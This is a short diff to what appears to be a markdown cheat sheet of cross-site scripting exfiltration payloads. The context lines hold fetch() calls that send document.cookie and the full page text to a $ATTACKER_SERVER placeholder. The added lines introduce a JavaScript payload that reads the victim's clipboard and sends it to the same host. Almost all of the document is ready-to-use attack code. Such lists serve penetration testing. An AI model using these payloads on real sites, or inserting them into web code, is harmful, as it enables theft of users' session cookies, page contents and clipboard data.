@@ -31,6 +31,10 @@ fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```javascript
 fetch("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
 ```
+### GET CONTENT FROM CLIPBOARD AND $FETCH *(Will prompt user for Clipboard perms if not already set)*
+```javascript
+setTimeout(async()=>fetch("https://$ATTACKER_SERVER/?copy="+(await window.navigator.clipboard.readText())), 1000)
+```
 ## JQuery AJAX
 ### GET VALUE FROM LOCAL STORAGE AND $.GET
 ```javascript
